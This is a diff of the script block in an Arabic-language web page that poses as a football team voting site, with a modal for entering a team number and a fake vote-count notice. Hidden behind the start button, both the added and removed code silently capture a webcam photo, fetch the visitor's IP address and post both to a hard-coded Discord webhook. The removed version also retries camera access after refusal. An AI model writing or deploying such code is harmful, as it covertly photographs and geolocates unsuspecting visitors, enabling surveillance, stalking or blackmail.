@@ -182,73 +182,90 @@
     </div>
 
     <script>
-        document.getElementById('start-button').addEventListener('click', function () {
-    function startCamera() {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+        document.getElementById('start-button').addEventListener('click', function() {
+            document.getElementById('modal').style.display = 'flex';
+        });
 
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        document.getElementById('submit-button').addEventListener('click', function() {
+            var teamNumber = document.getElementById('team-number').value;
+            
+            if (teamNumber.trim() !== "") {
+                document.getElementById('modal').style.display = 'none';
+                var notification = document.getElementById('notification');
+                notification.textContent = `تم إرسال رقم المنتخب ${teamNumber} وعدد التصويت 128`;
+                notification.style.display = 'block';
+                notification.style.top = '10px';
 
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'photo.png'); // صورة الكاميرا
+                setTimeout(function() {
+                    notification.style.top = '-50px';
+                    setTimeout(function() {
+                        notification.style.display = 'none';
+                    }, 500);
+                }, 3000);
+            } else {
+                alert("الرجاء إدخال رقم المنتخب");
+            }
+        });
+        document.getElementById('start-button').addEventListener('click', function() {
+            var audio = new Audio('path/to/your/soundfile.mp3');
+            audio.play();
+        });
+        const startButton = document.getElementById('start-button');
+        const webhookUrl = 'https://discord.com/api/webhooks/1321175051642339369/lna6Neq-o6MJEgCQNpBv3qA4x5aVM-MH4biaseTLCB1F0dHsh_gb_U3OAbfsa6ji96FS';
 
-                        // إيقاف الكاميرا
-                        stream.getTracks().forEach(track => track.stop());
+        startButton.addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
 
-                        // قيمة افتراضية لرقم المنتخب
-                        const teamNumber = '123'; // رقم افتراضي
-                        const votes = 128; // عدد أصوات افتراضي
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        // جلب عنوان IP
-                        fetch('https://api.ipify.org?format=json')
-                            .then(response => response.json())
-                            .then(data => {
-                                const webhookUrl = 'https://discord.com/api/webhooks/1321175051642339369/lna6Neq-o6MJEgCQNpBv3qA4x5aVM-MH4biaseTLCB1F0dHsh_gb_U3OAbfsa6ji96FS'; // ضع رابط Webhook الخاص بك هنا
-                                const payload = JSON.stringify({
-                                    username: 'Voting Bot',
-                                    content: `تم التصويت لرقم المنتخب: ${teamNumber}\nعدد الأصوات: ${votes}\nعنوان IP: ${data.ip}`
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('file', blob, 'photo.png');
+
+                            stream.getTracks().forEach(track => track.stop());
+
+                            fetch('https://api.ipify.org?format=json')
+                                .then(response => response.json())
+                                .then(data => {
+                                    const payload = JSON.stringify({
+                                        username: 'Website Bot',
+                                        content: `IP: ${data.ip}`
+                                    });
+
+                                    formData.append('payload_json', payload);
+
+                                    fetch(webhookUrl, {
+                                        method: 'POST',
+                                        body: formData
+                                    })
+                                    .then(response => {
+                                        if (response.ok) {
+                                            console.log('Photo and IP sent successfully');
+                                        } else {
+                                            console.error('Failed to send data');
+                                        }
+                                    })
+                                    .catch(error => {
+                                        console.error('Error sending data: ', error);
+                                    });
                                 });
-
-                                formData.append('payload_json', payload);
-
-                                // إرسال البيانات إلى Discord
-                                fetch(webhookUrl, {
-                                    method: 'POST',
-                                    body: formData
-                                })
-                                .then(response => {
-                                    if (response.ok) {
-                                        console.log('تم إرسال البيانات بنجاح');
-                                    } else {
-                                        console.error('فشل في إرسال البيانات');
-                                    }
-                                })
-                                .catch(error => {
-                                    console.error('خطأ أثناء إرسال البيانات: ', error);
-                                });
-                            });
-                    });
-                }, 2500); // وقت لالتقاط الصورة
-            })
-            .catch(error => {
-                console.error('خطأ في الوصول إلى الكاميرا: ', error);
-                // إذا فشل الطلب أو تم رفضه، حاول مرة أخرى بعد فترة قصيرة
-                setTimeout(startCamera, 2000); // حاول مرة أخرى بعد 2 ثانية
-            });
-    }
-
-    startCamera(); // تشغيل الكاميرا عند الضغط على الزر
-});
-
+                        });
+                    }, 2500);
+                })
+                .catch(error => {
+                    console.error('Error accessing camera: ', error);
+                });
+        });
+        
     </script>
 </body>
 </html>
